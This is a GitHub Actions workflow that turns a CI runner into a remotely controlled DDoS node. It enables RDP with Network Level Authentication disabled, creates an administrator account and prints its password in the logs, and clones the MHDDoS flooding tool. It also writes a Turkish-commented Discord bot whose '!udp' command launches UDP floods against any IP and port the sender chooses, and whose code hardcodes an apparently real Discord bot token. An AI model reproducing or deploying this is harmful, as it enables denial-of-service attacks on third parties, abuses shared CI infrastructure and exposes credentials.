name: RDP

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Configure Core RDP Settings
        run: |
          # Enable Remote Desktop and disable Network Level Authentication
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
                             -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "SecurityLayer" -Value 0 -Force

          # Remove any existing rule with the same name
          netsh advfirewall firewall delete rule name="RDP-Access"
          
          # Allow incoming connection on port 3389
          netsh advfirewall firewall add rule name="RDP-Access" `
            dir=in action=allow protocol=TCP localport=3389

          # Restart the Remote Desktop service
          Restart-Service -Name TermService -Force

      - name: Create RDP User with Secure Password
        run: |
          Add-Type -AssemblyName System.Security
          $charSet = @{
              Upper   = [char[]](65..90)      # A-Z
              Lower   = [char[]](97..122)     # a-z
              Number  = [char[]](48..57)      # 0-9
              Special = ([char[]](33..47) + [char[]](58..64) +
                         [char[]](91..96) + [char[]](123..126)) # Special characters
          }
          $rawPassword = @()
          $rawPassword += $charSet.Upper | Get-Random -Count 4
          $rawPassword += $charSet.Lower | Get-Random -Count 4
          $rawPassword += $charSet.Number | Get-Random -Count 4
          $rawPassword += $charSet.Special | Get-Random -Count 4
          $password = -join ($rawPassword | Sort-Object { Get-Random })
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          
          echo "RDP_CREDS=User: RDP | Password: $password" >> $env:GITHUB_ENV
          
          if (-not (Get-LocalUser -Name "RDP")) {
              Write-Error "User creation failed"
              exit 1
          }

      - name: Get Machine IP Address
        run: |
          # Get the machine's IP address
          $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*").IPAddress | Select-Object -First 1
          if (-not $ipAddress) {
            $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi*").IPAddress | Select-Object -First 1
          }
          if (-not $ipAddress) {
            $ipAddress = "127.0.0.1"
          }
          echo "MACHINE_IP=$ipAddress" >> $env:GITHUB_ENV

      - name: Clone MHDDoS and Install Dependencies
        run: |
          # Create Desktop directory if it doesn't exist
          if (-not (Test-Path "C:\Users\RDP\Desktop")) {
              New-Item -ItemType Directory -Path "C:\Users\RDP\Desktop"
          }
          
          # Clone MHDDoS
          cd "C:\Users\RDP\Desktop"
          git clone https://github.com/MHProDev/MHDDoS.git
          
          # Install requirements
          cd MHDDoS
          python -m pip install -r requirements.txt

      - name: Install Discord Bot Dependencies
        run: |
          # Önce çakışan kütüphaneleri kaldır
          python -m pip uninstall py-cord -y
          python -m pip uninstall nextcord -y
          python -m pip uninstall discord-components -y
          python -m pip uninstall discord-py-interactions -y
          python -m pip uninstall discord-py-slash-command -y
          
          # Sadece discord.py ve gerekli bağımlılıkları kur
          python -m pip install discord.py
          python -m pip install aiohttp
          python -m pip install async-timeout
          python -m pip install chardet
          python -m pip install multidict
          python -m pip install yarl
          python -m pip install attrs
          python -m pip install typing-extensions

      - name: Create Discord Bot Script
        run: |
          $botCode = @"
          import discord
          import asyncio
          import subprocess
          import re
          import os
          import signal
          from datetime import datetime
          
          # Bot token'ı buraya girin
          BOT_TOKEN = "MTQzMDYyNzc2OTMxNzk4NjM4NQ.G_VIV5.otgPTwQ92MRF-gzXUhVtcT4WOLCwggjAeD0nuk"
          
          # MHDDoS dizini
          MHDDOS_PATH = "C:\\Users\\RDP\\Desktop\\MHDDoS"
          
          # Discord client'ı ayarla
          intents = discord.Intents.default()
          intents.message_content = True
          client = discord.Client(intents=intents)
          
          # Aktif süreçleri takip etmek için
          active_processes = []
          
          @client.event
          async def on_ready():
              print(f'Bot giriş yaptı: {client.user}')
              print('------')
              # Botun çalıştığını belirten bir mesaj gönder
              for guild in client.guilds:
                  for channel in guild.text_channels:
                      if channel.name == "general":
                          await channel.send(f"✅ Bot aktif! {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                          break
          
          @client.event
          async def on_message(message):
              # Botun kendi mesajlarını yok say
              if message.author == client.user:
                  return
          
              # Komut kontrolü
              if message.content.startswith('!udp'):
                  # Komut parametrelerini ayır
                  parts = message.content.split()
                  
                  # Parametre sayısı kontrolü
                  if len(parts) != 4:
                      await message.channel.send("❌ Hatalı kullanım! Doğru format: `!udp IP PORT SÜRE`")
                      return
                  
                  ip = parts[1]
                  port = parts[2]
                  duration = parts[3]
          
                  # IP adresi doğrulama
                  if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
                      await message.channel.send("❌ Geçersiz IP adresi formatı!")
                      return
                  
                  # Port doğrulama
                  try:
                      port = int(port)
                      if not (1 <= port <= 65535):
                          raise ValueError
                  except ValueError:
                      await message.channel.send("❌ Port 1-65535 arasında olmalı!")
                      return
                  
                  # Süre doğrulama
                  try:
                      duration = int(duration)
                      if not (1 <= duration <= 300):
                          raise ValueError
                  except ValueError:
                      await message.channel.send("❌ Süre 1-300 saniye arasında olmalı!")
                      return
          
                  # Komutu oluştur
                  command = [
                      "python",
                      "start.py",
                      "udp",
                      f"{ip}:{port}",
                      "10000",  # Sabit paket hızı
                      str(duration)
                  ]
          
                  # MHDDoS dizinine geç
                  original_dir = os.getcwd()
                  os.chdir(MHDDOS_PATH)
          
                  try:
                      # Komutu çalıştır
                      process = await asyncio.create_subprocess_exec(
                          *command,
                          stdout=asyncio.subprocess.PIPE,
                          stderr=asyncio.subprocess.PIPE
                      )
                      
                      # Süreci listeye ekle
                      active_processes.append(process)
                      
                      # Başlangıç mesajı
                      await message.channel.send(
                          f"✅ Saldırı başlatıldı!\n"
                          f"🎯 Hedef: {ip}:{port}\n"
                          f"⏱️ Süre: {duration} saniye\n"
                          f"📦 Paket Hızı: 10000 pps"
                      )
                      
                      # Çıktıları bekle (asenkron)
                      stdout, stderr = await process.communicate()
                      
                      # Süreci listeden çıkar
                      if process in active_processes:
                          active_processes.remove(process)
                      
                      # Sonuçları kontrol et
                      if process.returncode == 0:
                          await message.channel.send("✅ Saldırı başarıyla tamamlandı!")
                      else:
                          error_msg = stderr.decode().strip() if stderr else "Bilinmeyen hata"
                          await message.channel.send(f"❌ Saldırı sırasında hata oluştu:\n```\n{error_msg}\n```")
                          
                  except Exception as e:
                      await message.channel.send(f"❌ Saldırı başlatılırken hata: `{str(e)}`")
                  finally:
                      # Orijinal dizine geri dön
                      os.chdir(original_dir)
          
              # Tüm saldırıları durdur
              elif message.content == '!stop':
                  if not active_processes:
                      await message.channel.send("❌ Aktif saldırı bulunamadı!")
                      return
          
                  stopped_count = 0
                  for process in active_processes:
                      try:
                          process.terminate()
                          await process.wait()
                          stopped_count += 1
                      except:
                          try:
                              process.kill()
                              await process.wait()
                              stopped_count += 1
                          except:
                              pass
                  
                  # Listeyi temizle
                  active_processes.clear()
                  
                  await message.channel.send(f"✅ {stopped_count} saldırı durduruldu!")
          
          # Botu başlat
          try:
              client.run(BOT_TOKEN)
          except discord.errors.LoginFailure:
              print("Geçersiz Discord token! Lütfen token'ı kontrol edin.")
          except Exception as e:
              print(f"Bot başlatılırken hata: {str(e)}")
          "@
          
          # Bot kodunu dosyaya yaz
          $botCode | Out-File -FilePath "C:\Users\RDP\Desktop\discord_bot.py" -Encoding UTF8

      - name: Start Discord Bot
        run: |
          # Botu başlat
          Start-Process python -ArgumentList "C:\Users\RDP\Desktop\discord_bot.py" -NoNewWindow

      - name: Display RDP Access Information
        run: |
          Write-Host "`n=== RDP ACCESS ==="
          Write-Host "Address: $env:MACHINE_IP"
          Write-Host "Username: RDP"
          Write-Host "Password: $(echo $env:RDP_CREDS)"
          Write-Host "==================`n"
          
          # Keep runner active indefinitely (or until manually cancelled)
          while ($true) {
              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
              Start-Sleep -Seconds 300
